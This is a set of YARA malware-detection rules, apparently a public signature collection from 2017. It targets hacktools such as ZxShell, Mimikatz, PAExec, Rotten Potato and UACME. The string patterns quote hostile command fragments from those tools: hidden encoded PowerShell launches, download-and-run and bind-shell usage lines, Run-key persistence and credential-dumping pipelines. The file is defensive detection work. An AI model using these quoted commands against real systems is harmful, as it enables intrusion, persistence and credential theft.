      $s3 = "[-] ERROR: op/ logfile" fullword ascii
      $s4 = "http://iframe.ip138.com/ic.asp" fullword wide
      $s5 = "TenSafe.exe" fullword wide
      $s6 = "CSocketMaster.RemoteHost" fullword wide
      $s7 = "Too many processes." fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and 4 of them ) or ( 6 of them )
}

rule Hacktool_wininet {
   meta:
      description = "Hacktool VT Research - file wininet.dll"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "bd039bb73f297062ab65f695dd6defafd146f6f233c451e5ac967a720b41fc14"
   strings:
      $x1 = "\\tools- InnerDll\\tools\\Release\\tools.pdb" ascii
      $x2 = "[-] LookupAccountName failed." fullword ascii

      $s1 = "taskkill /f /PID " fullword ascii
      $s2 = "WinAutologon From Winlogon Reg" fullword ascii
      $s3 = "IE:Password-Protected sites" fullword ascii
      $s4 = "REG ADD \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of ($x*) ) or ( 3 of them )
}

rule Hacktool_ms14_068 {
   meta:
      description = "Hacktool VT Research - file ms14-068.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "369136accf0042d5d277f8e65d3d16e223a46df4f1f7ab4b52689a81d23c229f"
   strings:
      $s1 = "%s -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>i" fullword ascii
      $s2 = "target_hostt" fullword ascii
      $s3 = "-p <clearPassword>s" fullword ascii
      $s4 = "Password: s" fullword ascii
      $s5 = "getpassc" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 70KB and all of them )
}

rule Hacktool_dllInjector_x64 {
   meta:
      description = "Hacktool VT Research - file dllInjector-x64.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "0fd0227f512b479bc09c581993792d41ceb2c90f0cdf8a2be7ed40501e1cca27"
   strings:
      $x1 = "\\dllinjector\\Release\\" ascii
      $x2 = "%s -p 1234 -l something.dll -P -c (Inject something.dll into process 1234)" fullword ascii
      $x3 = "%s -d (To Dump processes and get the PID)" fullword ascii
      $x4 = "[+] Dumping processes and PIDs.." fullword ascii
      $x5 = "Foundstone DLL Injector v%1.1f (%s)" fullword ascii
      $x6 = "[+] Injecting DLL: %s" fullword ascii
      $x7 = "[!] CreateRemoteThread Failed! [%d] Exiting...." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and 1 of them ) or ( 2 of them )
}

rule Hacktool_dfind2 {
   meta:
      description = "Hacktool VT Research - file dfind2.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "98ac62d762e620230273834057f14fc8b6956e6c5128e53afd8aff5006cbd53d"
   strings:
      $x1 = "[+]  . DFind -http 80 150 192.168.0.0 192.168.0.255  [THREADS] [-v]" fullword ascii
      $x2 = "Scan complete: %d / %d PORT(s) / %d IP(s) (open:%d rad:%d passwd:%d ntsec:%d)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule Hacktool_WPScanner {
   meta:
      description = "Hacktool VT Research - file WPScanner.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 70
      hash1 = "351a509e13130bb6a53897d6eda00eab18b4c4f0145e5ef750fb668d3fb51b95"
   strings:
      $s1 = "\\WPScanner.pdb" ascii
      $s2 = "WPScanner.exe" fullword wide
      $s3 = "WPScanner Like a WPScan in Linux" fullword wide
      $s4 = "Loop broken" fullword wide
      $s5 = "Confuser v1.9.0.0" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and 3 of them )
}

rule Hacktool_PWDumpX {
   meta:
      description = "Hacktool VT Research - file PWDumpX.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-29"
      score = 80
      hash1 = "a23bb3bc0cb2ce9746f665d3ce874aeb168a3d2d6b8953ab541364db6f6e9ca4"
   strings:
      $x1 = "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\DumpExt.dll." fullword ascii
      $x2 = "\\\\%s\\ADMIN$\\system32\\DumpSvc.exe" fullword ascii
      $x3 = "%windir%\\system32\\DumpSvc.exe" fullword ascii
      $x4 = "PWDumpX -clph" fullword ascii
      $x5 = "DumpExt.dll" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them ) or ( 3 of them )
}


/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-03
   Identifier: UACME Akagi
*/

/* Rule Set ----------------------------------------------------------------- */

rule UACME_Akagi_2 {
   meta:
      description = "Detects Windows User Account Control Bypass - from files Akagi32.exe, Akagi64.exe"
      author = "Florian Roth"
      reference = "https://github.com/hfiref0x/UACME"
      date = "2017-02-03"
      hash1 = "caf744d38820accb48a6e50216e547ed2bb3979604416dbcfcc991ce5e18f4ca"
      hash2 = "609e9b15114e54ffc40c05a8980cc90f436a4a77c69f3e32fe391c0b130ff1c5"
      score = 80
   strings:
      $x1 = "Usage: Akagi.exe [Method] [OptionalParamToExecute]" fullword wide
      $x2 = "[UCM] Target file already exists, abort" fullword wide

      $s1 = "MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" fullword wide
      $s2 = "Akagi.exe" fullword wide
      $s3 = "Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}" fullword wide
      $s4 = "/c wusa %ws /extract:%%windir%%\\system32\\sysprep" fullword wide
      $s5 = "/c wusa %ws /extract:%%windir%%\\system32\\migwiz" fullword wide
      $s6 = "loadFrom=\"%systemroot%\\system32\\sysprep\\cryptbase.DLL\"" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 900KB and ( 1 of ($x*) and 10 of ($s*) ) ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-07
   Identifier: Rotten Potato
*/

/* Rule Set ----------------------------------------------------------------- */

rule RottenPotato_Potato {
   meta:
      description = "Detects a component of privilege escalation tool Rotten Potato - file Potato.exe"
      author = "Florian Roth"
      reference = "https://github.com/foxglovesec/RottenPotato"
      date = "2017-02-07"
      score = 90
      hash1 = "59cdbb21d9e487ca82748168682f1f7af3c5f2b8daee3a09544dd58cbf51b0d5"
   strings:
      $x1 = "Potato.exe -ip <ip>" fullword wide
      $x2 = "-enable_httpserver true -enable_spoof true" fullword wide
      $x3 = "/C schtasks.exe /Create /TN omg /TR" fullword wide
      $x4 = "-enable_token true -enable_dce true" fullword wide
      $x5 = "DNS lookup succeeds - UDP Exhaustion failed!" fullword wide
      $x6 = "DNS lookup fails - UDP Exhaustion worked!" fullword wide
      $x7 = "\\obj\\Release\\Potato.pdb" fullword ascii
      $x8 = "function FindProxyForURL(url,host){if (dnsDomainIs(host, \"localhost\")) return \"DIRECT\";" fullword wide

      $s1 = "\"C:\\Windows\\System32\\cmd.exe\" /K start" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of ($x*) ) or ( 2 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-08
   Identifier: Fileless Attacks - Securelist Kaspersky Report
*/

/* Rule Set ----------------------------------------------------------------- */

rule Metasploit_Payloads_201702 {
   meta:
      description = "Detects Metasploit Payloads - msfvenom"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77403/fileless-attacks-against-enterprise-networks/"
      date = "2017-02-09"
      score = 80
   strings:
      $s1 = "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden" ascii
   condition:
      1 of them
}

rule Suspicious_PowerShell_Hidden {
   meta:
      description = "Detects a suspicious Powershell command execution"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77403/fileless-attacks-against-enterprise-networks/"
      date = "2017-02-09"
      score = 60
   strings:
      $s1 = "powershell.exe -nop -w hidden -e " ascii fullword
   condition:
      1 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-14
   Identifier: ZxShell
*/

/* Rule Set ----------------------------------------------------------------- */

rule ZxShel_TransFile {
   meta:
      description = "Detects ZxShell / TransFile"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-14"
      score = 85
      hash1 = "4ea20712d2171c583d7c1ddfc4f793da3e616b4ff5303d79183cceb7f34d4f8f"
   strings:
      $x1 = "TransFile -get http://x.x.x.x/a.exe c:\\a.exe -run (launch it after downloading completed.)" fullword ascii
      $x2 = "-e cmd.exe x.x.x.x 99" fullword ascii
      $x3 = "-p 99 (bind a cmdshell)" fullword ascii
      $x4 = "TransFile -get ftp://user:pass@x.x.x.x/a.exe c:\\a.exe" fullword ascii
      $x5 = "Execute The Command Successfully" fullword ascii
      $x6 = "[-l -f -e <cmd>] [-h <IP>] [-p <Port>] [ quitnc ]" fullword ascii
      $x7 = "user pass c:\\a.exe a.exe" fullword ascii
      $x8 = "svesrhost.exe" fullword ascii
      $x9 = "Shared a shell to %s:%s Successfully." fullword ascii
      $x10 = "ShareShell 1.1.1.1 99" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 3 of them )
}

rule Hacktool_Antisniff {
   meta:
      description = "Detects hacktool named Antisnfii"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-14"
      score = 85
      hash1 = "6fe61d515e75b251810bcaaef3b62d3937804711017d84ceddf0156dbc768d83"
   strings:
      $x1 = "AntiSniff -a wireshark.exe" fullword ascii
      $x2 = "====**==== Plug-in Execute:"
      $x3 = "Error(\"%s\" isn`t exist.) ====**====" fullword ascii
      $x4 = "\\system32\\drivers\\FilterMgr.sys" fullword ascii
      $x5 = "AntiSniff -a netman.exe" fullword ascii
      $x6 = "%s\\rundll32.exe %s ShellMainThread" fullword ascii

      $s1 = "Command to delete failed %s." fullword ascii
      $s2 = "OpenProcess error:%d" fullword ascii
      $s3 = "Windows\\Microsoft.NET\\Netsetup.log" fullword ascii
      $s4 = "A\\Start Menu\\Programs\\Startup\\update.exe" fullword wide

      $op1 = { e8 10 d9 ff ff 8b 85 a0 f6 ff ff e8 c4 19 00 00 } /* Opcode */
      $op2 = { 56 e8 ca 4b ff ff 59 83 f8 ff 74 2e 56 e8 be 4b } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and ( 1 of ($x*) or 3 of ($s*) ) or all of ($op*) ) or ( 5 of them )
}

rule ZxShell_SocksProxy {
   meta:
      description = "Detects ZxShell / SocksProxy"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-14"
      score = 85
      hash1 = "c6afc2ea45abacd6976302bd8368ce927d8bd498ec452a1e685fa0936873f3b4"
   strings:
      $x1 = "-ip 1.1.1.1-1.1.2.254 -p 80 -f \"IP: %s:%d\"" fullword ascii
      $x2 = "%s\\rundll32.exe %s,ncProxyXll %s" fullword ascii
      $x3 = "C:\\windows\\system32\\test.log" fullword ascii
      $x4 = "Dump cleartext passwords" fullword ascii
      $x5 = "-b 1080 -e 45 -d 61.8.8.13-61.8.9.28" fullword ascii
      $x6 = "RunAs                     ==>Other processes or the identity of the user running the program" fullword ascii
      $x7 = "Create new process as another User or Process context." fullword ascii
      $x8 = "<outputformat> [-timeout] sec [-thread] maxthread [-save] <filename>" fullword ascii
      $x9 = "runas 724 test.exe" fullword ascii
      $s10 = "SockProxy -q (End Proxy Service.)" fullword ascii
      $s11 = "runas test.exe      (run test.exe with the context of lsass.exe default.)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or 3 of them
}

rule ZxShell_Generic_1 {
   meta:
      description = "Detects ZxShell Hacktool"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-14"
      score = 85
      hash1 = "14d8a2c0e6a3f2f9ad6b3d136d323582fd08aa566117e2f099c394c98e8a08c7"
   strings:
      $x1 = "zxFunction001" fullword ascii
      $x2 = "@_ZXSHELL_@/B_" fullword ascii

      $s1 = "sysevent.dll" fullword ascii
      $s2 = "I\\windows\\system32\\" fullword ascii
      $s3 = "\\\\.\\p*rS" fullword ascii
      $s4 = "Eolass" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and ( 1 of ($x*) or 3 of them ) ) or 5 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-19
   Identifier: Lazykatz
*/

/* Rule Set ----------------------------------------------------------------- */

rule Autoit_Script_Suspicious {
   meta:
      description = "Autoit Compiled EXE - suspicious OpCodes - possible FP"
      author = "Florian Roth"
      reference = "https://github.com/bhdresh/lazykatz"
      date = "2017-02-19"
      score = 60
      hash1 = "12552589f4d2de66d90924a0a89b62ebd73d63c36d2da715d38107a4583b6b17"
   strings:
      $op1 = { 8b 30 56 e8 64 0e 04 00 b9 dc 57 4c 00 e8 56 f4 } /* Opcode */
      $op2 = { c6 05 14 00 4c 00 00 c7 05 18 00 4c 00 1c 20 49 } /* Opcode */
      $op3 = { b9 90 58 4c 00 50 e8 7a cc 01 00 84 c0 0f 84 d9 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and 2 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-25
   Identifier: Hacktools (VT Notification History)
*/

/* Rule Set ----------------------------------------------------------------- */

rule Hacktool_Inject_Incognito {
   meta:
      description = "Detects hacktool inject"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-25"
      hash1 = "5904a62fdbd9614b9ce033435ba048755084edf80b1d2a40f2e9031fbb7f9f72"
   strings:
      $x1 = "[*] Attempting to add user %s to localgroup %s on host %s" fullword ascii
      $x2 = "ext_server_incognito.x64.dll" fullword ascii
      $x3 = "[-] Failed to enumerate tokens with error code: %d" fullword ascii
      $x4 = "[-] Operation only allowed on primary domain controller" fullword ascii
      $x5 = "[+] Successfully impersonated user " fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )
}

rule Hacktoo_Transmit_Feb17 {
   meta:
      description = "Detects unspecified hacktool (proxy)"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-25"
      hash1 = "ab38ebff70f732f8ad8bf012347ba9f2860f7475b19bd24336bdfb474afffb03"
   strings:
      $s16 = "[+] Accept a Client on port %d from %s ......" fullword ascii
      $s17 = "[+] Start Transmit (%s:%d <-> %s:%d) ......" fullword ascii
      $s20 = "[+] Listening port %d ......" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-27
   Identifier: TRTool
*/

/* Rule Set ----------------------------------------------------------------- */

rule CN_TRTool_Lcx {
   meta:
      description = "Detects LCX hacktool (htran for Linux)"
      author = "Florian Roth"
      reference = "https://github.com/neroanelli/trtool"
      date = "2017-02-27"
      hash1 = "d35954039f19724272332db942b47766d8cc20f2ca6dc7e57bff0593a5c0ac2c"
   strings:
      $x1 = "-m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename]" fullword ascii
      $x2 = "[SERVER]connection to %s:%d error" fullword ascii
      $x3 = "accept a client on port %d from %s,waiting another on port %d...." fullword ascii
      $x4 = "3: connect to HOST1:PORT1 and HOST2:PORT2" fullword ascii
      $x5 = "[+] all hosts connected!" fullword ascii
      $x6 = "got,ip:%s,port:%d" fullword ascii
   condition:
      1 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-03-15
   Identifier: Windows Password Recovery
*/

/* Rule Set ----------------------------------------------------------------- */

rule WPR_loader_EXE {
   meta:
      description = "Windows Password Recovery - file loader.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "e7d158d27d9c14a4f15a52ee5bf8aa411b35ad510b1b93f5e163ae7819c621e2"
   strings:
      $s1 = "Failed to get system process ID" fullword wide
      $s2 = "gLSASS.EXE" fullword wide
      $s3 = "WriteProcessMemory failed" fullword wide
      $s4 = "wow64 process NOT created" fullword wide
      $s5 = "\\ast.exe" fullword wide
      $s6 = "Exit code=%s, status=%d" fullword wide
      $s7 = "VirtualProtect failed" fullword wide
      $s8 = "nSeDebugPrivilege" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 3 of them )
}

rule WPR_loader_DLL {
   meta:
      description = "Windows Password Recovery - file loader64.dll"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "7b074cb99d45fc258e0324759ee970467e0f325e5d72c0b046c4142edc6776f6"
      hash2 = "a1f27f7fd0e03601a11b66d17cfacb202eacf34f94de3c4e9d9d39ea8d1a2612"
   strings:
      $x1 = "loader64.dll" fullword ascii
      $x2 = "loader.dll" fullword ascii

      $s1 = "TUlDUk9TT0ZUX0FVVEhFTlRJQ0FUSU9OX1BBQ0tBR0VfVjFfMA==" fullword ascii /* base64 encoded string 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0' */
      $s2 = "UmVtb3RlRGVza3RvcEhlbHBBc3Npc3RhbnRBY2NvdW50" fullword ascii /* base64 encoded string 'RemoteDesktopHelpAssistantAccount' */
      $s3 = "U2FtSVJldHJpZXZlUHJpbWFyeUNyZWRlbnRpYWxz" fullword ascii /* base64 encoded string 'SamIRetrievePrimaryCredentials' */
      $s4 = "VFM6SW50ZXJuZXRDb25uZWN0b3JQc3dk" fullword ascii /* base64 encoded string 'TS:InternetConnectorPswd' */
      $s5 = "TCRVRUFjdG9yQWx0Q3JlZFByaXZhdGVLZXk=" fullword ascii /* base64 encoded string 'L$UEActorAltCredPrivateKey' */
      $s6 = "YXNwbmV0X1dQX1BBU1NXT1JE" fullword ascii /* base64 encoded string 'aspnet_WP_PASSWORD' */
      $s7 = "TCRBTk1fQ1JFREVOVElBTFM=" fullword ascii /* base64 encoded string 'L$ANM_CREDENTIALS' */
      $s8 = "RGVmYXVsdFBhc3N3b3Jk" fullword ascii /* base64 encoded string 'DefaultPassword' */

      $op0 = { 48 8b cd e8 e0 e8 ff ff 48 89 07 48 85 c0 74 72 } /* Opcode */
      $op1 = { e8 ba 23 00 00 33 c9 ff 15 3e 82 } /* Opcode */
      $op2 = { 48 83 c4 28 e9 bc 55 ff ff 48 8d 0d 4d a7 00 00 } /* Opcode */
   condition:
      uint16(0) == 0x5a4d and
      filesize < 400KB and
      (
         ( 1 of ($x*) and 1 of ($s*) ) or
         ( 1 of ($s*) and all of ($op*) )
      )
}

rule WPR_Passscape_Loader {
   meta:
      description = "Windows Password Recovery - file ast.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "f6f2d4b9f19f9311ec419f05224a1c17cf2449f2027cb7738294479eea56e9cb"
   strings:
      $s1 = "SYSTEM\\CurrentControlSet\\Services\\PasscapeLoader64" fullword wide
      $s2 = "ast64.dll" fullword ascii
      $s3 = "\\loader64.exe" fullword wide
      $s4 = "Passcape 64-bit Loader Service" fullword wide
      $s5 = "PasscapeLoader64" fullword wide
      $s6 = "ast64 {msg1GkjN7Sh8sg2Al7ker63f}" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule WPR_Asterisk_Hook_Library {
   meta:
      description = "Windows Password Recovery - file ast64.dll"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "225071140e170a46da0e57ce51f0838f4be00c8f14e9922c6123bee4dffde743"
      hash2 = "95ec84dc709af990073495082d30309c42d175c40bd65cad267e6f103852a02d"
   strings:
      $s1 = "ast64.dll" fullword ascii
      $s2 = "ast.dll" fullword wide
      $s3 = "c:\\%s.lvc" fullword ascii
      $s4 = "c:\\%d.lvc" fullword ascii
      $s5 = "Asterisk Hook Library" fullword wide
      $s6 = "?Ast_StartRd64@@YAXXZ" fullword ascii
      $s7 = "Global\\{1374821A-281B-9AF4-%04X-12345678901234}" fullword ascii
      $s8 = "2004-2013 Passcape Software" fullword wide
      $s9 = "Global\\Passcape#6712%04X" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 3 of them )
}

rule WPR_WindowsPasswordRecovery_EXE {
   meta:
      description = "Windows Password Recovery - file wpr.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "c1c64cba5c8e14a1ab8e9dd28828d036581584e66ed111455d6b4737fb807783"
   strings:
      $x1 = "UuPipe" fullword ascii
      $x2 = "dbadllgl" fullword ascii
      $x3 = "UkVHSVNUUlkgTU9O" fullword ascii /* base64 encoded string 'REGISTRY MON' */
      $x4 = "RklMRSBNT05JVE9SIC0gU1l" fullword ascii /* base64 encoded string 'FILE MONITOR - SY' */

      $s1 = "WPR.exe" fullword wide
      $s2 = "Windows Password Recovery" fullword wide

      $op0 = { 5f df 27 17 89 } /* Opcode */
      $op1 = { 5f 00 00 f2 e5 cb 97 } /* Opcode */
      $op2 = { e8 ed 00 f0 cc e4 00 a0 17 } /* Opcode */
   condition:
      uint16(0) == 0x5a4d and
      filesize < 20000KB and
      (
         1 of ($x*) or
         all of ($s*) or
         all of ($op*)
      )
}

rule WPR_WindowsPasswordRecovery_EXE_64 {
   meta:
      description = "Windows Password Recovery - file ast64.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "4e1ea81443b34248c092b35708b9a19e43a1ecbdefe4b5180d347a6c8638d055"
   strings:
      $s1 = "%B %d %Y  -  %H:%M:%S" fullword wide

      $op0 = { 48 8d 8c 24 50 22 00 00 e8 bf eb ff ff 4c 8b c7 } /* Opcode */
      $op1 = { ff 15 16 25 01 00 f7 d8 1b } /* Opcode */
      $op2 = { e8 c2 26 00 00 83 20 00 83 c8 ff 48 8b 5c 24 30 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}


/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-03-17
   Identifier: BeyondExec Remote Access Tool
*/

/* Rule Set ----------------------------------------------------------------- */

rule BeyondExec_RemoteAccess_Tool {
   meta:
      description = "Detects BeyondExec Remote Access Tool - file rexesvr.exe"
      author = "Florian Roth"
      reference = "https://goo.gl/BvYurS"
      date = "2017-03-17"
      hash1 = "3d3e3f0708479d951ab72fa04ac63acc7e5a75a5723eb690b34301580747032c"
   strings:
      $x1 = "\\BeyondExecV2\\Server\\Release\\Pipes.pdb" ascii
      $x2 = "\\\\.\\pipe\\beyondexec%d-stdin" fullword ascii
      $x3 = "Failed to create dispatch pipe. Do you have another instance running?" fullword ascii

      $op1 = { 83 e9 04 72 0c 83 e0 03 03 c8 ff 24 85 80 6f 40 } /* Opcode */
      $op2 = { 6a 40 33 c0 59 bf e0 d8 40 00 f3 ab 8d 0c 52 c1 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($x*) or all of ($op*) ) ) or ( 3 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-03-27
   Identifier: PAexec
*/

/* Rule Set ----------------------------------------------------------------- */

rule PAExec {
   meta:
      description = "Detects remote access tool PAEXec (like PsExec) - file PAExec.exe"
      author = "Florian Roth"
      reference = "http://researchcenter.paloaltonetworks.com/2017/03/unit42-shamoon-2-delivering-disttrack/"
      date = "2017-03-27"
      score = 60
      hash1 = "01a461ad68d11b5b5096f45eb54df9ba62c5af413fa9eb544eacb598373a26bc"
   strings:
      $x1 = "Ex: -rlo C:\\Temp\\PAExec.log" fullword ascii
      $x2 = "Can't enumProcesses - Failed to get token for Local System." fullword wide
      $x3 = "PAExec %s - Execute Programs Remotely" fullword wide
      $x4 = "\\\\%s\\pipe\\PAExecIn%s%u" fullword wide
      $x5 = "\\\\.\\pipe\\PAExecIn%s%u" fullword wide
      $x6 = "%%SystemRoot%%\\%s.exe" fullword wide
      $x7 = "in replacement for PsExec, so the command-line usage is identical, with " fullword ascii
      $x8 = "\\\\%s\\ADMIN$\\PAExec_Move%u.dat" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and 1 of ($x*) ) or ( 3 of them )
}

rule PAExec_Cloaked {
   meta:
      description = "Detects a renamed remote access tool PAEXec (like PsExec)"
      author = "Florian Roth"
      reference = "http://researchcenter.paloaltonetworks.com/2017/03/unit42-shamoon-2-delivering-disttrack/"
      date = "2017-03-27"
      score = 60
      hash1 = "01a461ad68d11b5b5096f45eb54df9ba62c5af413fa9eb544eacb598373a26bc"
   strings:
      $x1 = "Ex: -rlo C:\\Temp\\PAExec.log" fullword ascii
      $x2 = "Can't enumProcesses - Failed to get token for Local System." fullword wide
      $x3 = "PAExec %s - Execute Programs Remotely" fullword wide
      $x4 = "\\\\%s\\pipe\\PAExecIn%s%u" fullword wide
      $x5 = "\\\\.\\pipe\\PAExecIn%s%u" fullword wide
      $x6 = "%%SystemRoot%%\\%s.exe" fullword wide
      $x7 = "in replacement for PsExec, so the command-line usage is identical, with " fullword ascii
      $x8 = "\\\\%s\\ADMIN$\\PAExec_Move%u.dat" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and 1 of ($x*) )
      and not filename == "paexec.exe"
      and not filename == "PAExec.exe"
      and not filename == "PAEXEC.EXE"
      and not filename matches /Install/
      and not filename matches /uninstall/
}

rule PAExec_Log_Output {
   meta:
      description = "Detects remote access tool PAEXec log output (like PsExec) - file PAExec.log"
      author = "Florian Roth"
      reference = "http://researchcenter.paloaltonetworks.com/2017/03/unit42-shamoon-2-delivering-disttrack/"
      date = "2017-03-27"
      score = 60
   strings:
      $l1 = "PAExec failed to create pipe" fullword wide ascii
      $l2 = " Can't cleanup PAExec." fullword wide ascii
      $l3 = "\\PAExec\\Release\\PAExec.pdb" ascii
      $l4 = "PAExec starting process [" wide ascii
   condition:
      not uint16(0) == 0x5a4d and 1 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-03-30
   Identifier: Mimikatz
*/

rule Mimikatz_Special_Sig {
	meta:
		description = "Detects Mimikatz based on specific byte chains"
		author = "Florian Roth"
		reference = "Internal Research"
		date = "2017-03-30"
		score = 60
	strings:
		/* Mark about PtH */
		$c1 = { 00 00 00 00 4D 00 61 00 72 00 6B 00 20 00 61 00 62 00 6F 00 75
			00 74 00 20 00 50 00 74 00 48 00 }
		/* markrus */
		$c2 = { 00 00 00 00 6D 00 61 00 72 00 6B 00 72 00 75 00 73 00 73 00 00 00
			00 00 }
		$c3 = { 00 25 00 2A 00 73 00 2A 00 2A 00 4B 00 45 00 59 }
		$c4 = { 28 00 30 00 78 00 25 00 30 00 38 00 78 00 29 00 0A 00 00 00 00 00
			54 00 6F 00 6B 00 65 00 6E 00 00 00 }
		$c5 = { 00 63 00 72 00 65 00 64 00 00 00 00 00 76 00 61 00 75 00 6C 00
			74 00 00 00 63 00 61 00 63 00 68 00 65 00 00 00 64 00 70 00 61 00 70
			00 69 00 00 00 63 00 6E 00 67 00 00 00 63 00 61 00 70 00 69 00 00 00
			00 00 73 00 79 00 73 00 74 00 65 00 6D 00 00 00 00 00 68 00 61 00 73
			00 68 }
	condition:
		uint16(0) == 0x5a4d and 1 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-03-30
   Identifier: Vault7
*/

/* Rule Set ----------------------------------------------------------------- */

rule Vault7_Malware_1 {
   meta:
      description = "Detects Vault7 Malware"
      author = "Florian Roth"
      reference = "Cyber Brief 01/2017"
      date = "2017-03-30"
      hash1 = "ea042bd3a7df11273e233c423e9740e6b51001911139855ef39501472a1e5fb0"
      hash2 = "f0d422222b6b39b4a141b6916cb4c844aeb6173fe185fe1030497d273f4e1377"
   strings:
      $x1 = "-executionPolicy unrestricted -WindowStyle Hidden -NonInteractive -Command " fullword wide
      $x2 = "notepad.cc/ajax/update_contents/" fullword wide

      $s1 = "$t=$fldr.GetTask($tn);$bts=[Convert]::FromBase" ascii
      $s2 = "payload_attempted" fullword ascii
      $s3 = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch; " fullword wide
      $s4 = "payload_executed" fullword ascii
      $s5 = "Installer.dll" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and ( 1 of ($x*) or 3 of them )
}

rule Vault7_Malware_2 {
   meta:
      description = "Detects Vault7 Malware"
      author = "Florian Roth"
      reference = "Cyber Brief 01/2017"
      date = "2017-03-30"
      hash1 = "7bb70ab14ad6003d77529f9edf9fa89dfde7656526f2393c07ae9d03455522f2"
      hash2 = "172e496fc433592c3c7760fb97451106b5188189987477e5a33b13b5eee685e9"
   strings:
      $s1 = "winmem.exe" fullword wide
      $s2 = "winkvm.exe" fullword wide
      $s3 = "%s%x.tmp" fullword wide
      $s4 = "\\*.EXE" fullword wide

      $op1 = { e8 a2 a4 ff ff ff b6 e8 } /* Opcode */
      $op2 = { e8 60 a5 ff ff ff b6 94 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 2 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-04-01
   Identifier: Mimipenguin
*/

rule Mimipenguin_SH {
   meta:
      description = "Detects Mimipenguin Password Extractor - Linux"
      author = "Florian Roth"
      reference = "https://github.com/huntergregal/mimipenguin"
      date = "2017-04-01"
   strings:
      $s1 = "$(echo $thishash | cut -d'$' -f 3)" ascii
      $s2 = "ps -eo pid,command | sed -rn '/gnome\\-keyring\\-daemon/p' | awk" ascii
      $s3 = "MimiPenguin Results:" ascii
   condition:
      1 of them
}
